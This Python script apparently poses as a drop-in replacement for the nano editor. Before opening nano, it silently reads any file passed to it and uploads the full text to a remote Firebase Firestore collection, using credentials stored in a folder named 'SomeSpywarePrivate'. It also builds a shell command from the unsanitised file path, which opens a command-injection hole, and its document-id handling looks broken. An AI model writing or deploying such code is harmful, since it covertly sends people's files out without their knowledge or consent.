# Required for reading input arguments (sys.argv)
import sys
# Required to execute nano
import os
# For random string
import uuid
# Required for uploading the files
import firebase_admin
from firebase_admin import firestore
from firebase_admin import credentials

# Use your file here
cred = credentials.Certificate("../SomeSpywarePrivate/firebase_access_file.json")
firebase_admin.initialize_app(cred)
# Create a firestore
db = firestore.client()


# How many arguments are there?
length = len(sys.argv)

if length > 1:
    file_text = ""
    # Read the file if possible
    with open(sys.argv[1]) as file:
        file_text = file.read()

    file_name = sys.argv[1].split("/")
    # Generate json data
    data = {
        'path': file_name,
        'text': file_text
    }

    doc_ref = db.collection('files').document(file_name)
    doc_ref.set(data)
    
    os.system("nano " + sys.argv[1])
else:
    os.system("nano")

